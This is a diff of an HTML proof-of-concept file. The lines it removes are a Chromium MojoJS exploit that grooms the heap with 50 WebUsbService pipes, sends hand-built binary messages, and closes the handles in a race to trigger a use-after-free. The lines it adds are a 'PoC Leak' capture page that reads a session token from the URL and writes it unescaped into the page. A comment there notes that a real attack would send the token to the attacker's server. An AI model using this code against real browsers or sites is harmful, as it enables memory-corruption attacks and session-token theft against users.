@@ -1,71 +1,14 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>MojoJS Sandbox Escape</title>
-    <script src="gen/mojo/public/js/bindings.js"></script>
-</head>
+<head><title>PoC Leak</title></head>
 <body>
-    <h1>MojoJS Ghost Payload linxu (Aligned Binary)</h1>
-    <script type="module">
-        import { WebUsbService } from './gen/third_party/blink/public/mojom/usb/web_usb_service.mojom.m.js';
-
-        async function triggerExploit() {
-            if (typeof Mojo === 'undefined') {
-                console.error("[-] MojoJS not found.");
-                return;
-            }
-
-            console.log("[*] Grooming the Browser Heap with raw pipes...");
-            let pipes = [];
-            
-            for(let i = 0; i < 50; i++) {
-                let pipe = Mojo.createMessagePipe();
-                Mojo.bindInterface(WebUsbService.$interfaceName, pipe.handle0);
-                pipes.push(pipe.handle1);
-            }
-
-            console.log("[+] Bound 50 pipes. Forging aligned binary GetDevices message...");
-            
-            // Construct the exact 40-byte Mojo Message 
-            let buffer = new ArrayBuffer(40);
-            let view = new DataView(buffer);
-            
-            // --- 1. MOJO MESSAGE HEADER (32 bytes for Version 1) ---
-            view.setUint32(0, 32, true);  // Header Size: 32 bytes
-            view.setUint32(4, 1, true);   // Header Version: 1
-            view.setUint32(8, 0, true);   // Interface ID: 0 
-            view.setUint32(12, 0, true);  // Message Ordinal: 0 (GetDevices)
-            view.setUint32(16, 1, true);  // Flags: 1 (kMessageExpectsResponse)
-            view.setUint32(20, 0, true);  // Padding
-            // Request ID (uint64, split into two 32-bit writes for compatibility)
-            view.setUint32(24, 1, true);  // Request ID (Low)
-            view.setUint32(28, 0, true);  // Request ID (High)
-            
-            // --- 2. METHOD PAYLOAD STRUCT (8 bytes) ---
-            // The empty struct expected by GetDevices
-            view.setUint32(32, 8, true);  // Struct Size: 8 bytes
-            view.setUint32(36, 0, true);  // Struct Version: 0
-            
-            for(let p of pipes) {
-                // Send the perfectly formed binary message
-                p.writeMessage(buffer, []);
-            }
-
-            // THE RACE CONDITION
-            await new Promise(r => setTimeout(r, 1)); 
-
-            console.log("[!] TRIGGERING FREE...");
-            
-            // The Kill: Close the native handles
-            for(let p of pipes) {
-                p.close();
-            }
-
-            if (window.gc) { window.gc(); }
-            console.log("[?] Done. Check for Browser crash.");
-        }
-
-        triggerExploit();
+    <h1>Capture Page</h1>
+    <script>
+        // In a real attack, you'd send this to your server logs
+        const urlParams = new URLSearchParams(window.location.search);
+        const leakedData = urlParams.get('token');
+        console.log("Leaked Data captured: " + leakedData);
+        document.write("<h2>Captured Session Info:</h2><p>" + leakedData + "</p>");
     </script>
 </body>
 </html>
